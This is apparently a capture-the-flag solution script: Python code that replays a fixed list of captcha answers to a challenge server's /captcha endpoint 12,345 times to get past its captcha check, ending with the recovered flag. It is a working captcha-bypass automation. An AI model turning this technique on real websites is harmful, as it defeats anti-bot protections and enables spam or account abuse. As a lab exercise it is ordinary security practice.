import requests

url = 'http://recruit.osiris.bar:32007'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

session = requests.Session()
session.headers.update(headers)
session.get(url)

captchas = [104829, 690556, 827372, 636494, 840695, 806005, 971630, 589804, 258185, 889102, ]

for i in range(12345):
    for captcha in captchas:
        form_data = 'answer=' + str(captcha)
        response = session.post(f"{url}/captcha", data=form_data)
        if response.status_code == 200 and f"{i+1} / 12345" in response.text:
            print(f"Attempt {i+1}/12345")
            break

print(response.text)

# flag{totallyrandomcaptchas}
